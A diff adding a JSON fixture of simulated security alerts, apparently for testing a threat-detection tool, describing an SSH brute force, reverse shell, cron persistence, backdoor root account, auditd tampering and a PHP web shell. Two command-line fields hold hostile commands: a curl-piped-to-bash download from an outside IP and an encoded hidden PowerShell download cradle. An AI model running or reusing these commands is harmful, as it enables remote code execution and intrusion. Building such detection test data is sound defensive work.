@@ -1,0 +1,107 @@
+{
+  "source": "real_attack_sim",
+  "source_type": "api",
+  "events": [
+    {
+      "event_type": "failed_login",
+      "severity": "high",
+      "message": "SSH brute force: 1,247 failed login attempts from 45.33.32.156 to root@10.0.0.5:22 in 3 minutes — possible credential stuffing",
+      "source_ip": "45.33.32.156",
+      "dest_port": 22,
+      "user": "root",
+      "protocol": "TCP"
+    },
+    {
+      "event_type": "malicious_process",
+      "severity": "critical",
+      "message": "Suspicious process: /tmp/.systemd-boot executed with no parent — masquerading as system binary, memory-only execution detected",
+      "source_ip": "10.0.0.5",
+      "process_name": ".systemd-boot",
+      "command_line": "/tmp/.systemd-boot -c \"curl http://45.33.32.156:8080/load.sh | bash\""
+    },
+    {
+      "event_type": "unusual_process",
+      "severity": "high",
+      "message": "Unusual process: python3 reverse shell from 10.0.0.5:4444 to 198.51.100.20:9999 — possible C2 callback",
+      "source_ip": "10.0.0.5",
+      "dest_ip": "198.51.100.20",
+      "dest_port": 9999,
+      "process_name": "python3"
+    },
+    {
+      "event_type": "suspicious_file",
+      "severity": "high",
+      "message": "Suspicious file created: /var/tmp/.../update.sh with execute permissions and no owner — possible web shell upload",
+      "source_ip": "192.168.1.100",
+      "file_path": "/var/tmp/.../update.sh"
+    },
+    {
+      "event_type": "external_connection",
+      "severity": "high",
+      "message": "Unknown outbound connection from 10.0.0.5 to 198.51.100.50:443 — no DNS record matches, possible C2 beacon",
+      "source_ip": "10.0.0.5",
+      "dest_ip": "198.51.100.50",
+      "dest_port": 443,
+      "protocol": "TCP"
+    },
+    {
+      "event_type": "suspicious_network",
+      "severity": "high",
+      "message": "Port scan detected: 185.220.101.20 scanned 2,304 ports on 10.0.0.5 in 12 seconds — possible reconnaissance",
+      "source_ip": "185.220.101.20",
+      "dest_ip": "10.0.0.5",
+      "dest_port": 0,
+      "protocol": "TCP"
+    },
+    {
+      "event_type": "scheduled_task",
+      "severity": "high",
+      "message": "Cron job modified: @reboot /var/tmp/.cache-update added to crontab for user www-data — persistence mechanism",
+      "source_ip": "10.0.0.5",
+      "user": "www-data",
+      "command_line": "@reboot /var/tmp/.cache-update"
+    },
+    {
+      "event_type": "user_created",
+      "severity": "high",
+      "message": "New user account created: 'supportadmin' added with UID 0 and sudo privileges — possible backdoor account",
+      "source_ip": "10.0.0.5",
+      "user": "supportadmin"
+    },
+    {
+      "event_type": "file_changed",
+      "severity": "high",
+      "message": "Critical file modified: /etc/shadow accessed outside of normal password change window — possible credential harvesting",
+      "source_ip": "10.0.0.5",
+      "file_path": "/etc/shadow"
+    },
+    {
+      "event_type": "encoded_powershell",
+      "severity": "critical",
+      "message": "Encoded command execution: powershell -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA — hidden download cradle detected",
+      "source_ip": "10.0.0.5",
+      "command_line": "powershell -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+    },
+    {
+      "event_type": "tamper_detected",
+      "severity": "critical",
+      "message": "Security tool disabled: /etc/audit/auditd.conf cleared — auditd will not start on reboot, attacker covering tracks",
+      "source_ip": "10.0.0.5",
+      "file_path": "/etc/audit/auditd.conf"
+    },
+    {
+      "event_type": "new_listener",
+      "severity": "high",
+      "message": "New TCP listener on port 4444 bound to 0.0.0.0 — possible bind shell or C2 listener, no known service on this port",
+      "source_ip": "10.0.0.5",
+      "dest_port": 4444
+    },
+    {
+      "event_type": "suspicious_file",
+      "severity": "high",
+      "message": "Web shell detected: /var/www/html/upload.php contains system() call with base64_decode — remote command execution possible",
+      "source_ip": "192.168.1.100",
+      "file_path": "/var/www/html/upload.php"
+    }
+  ]
+}
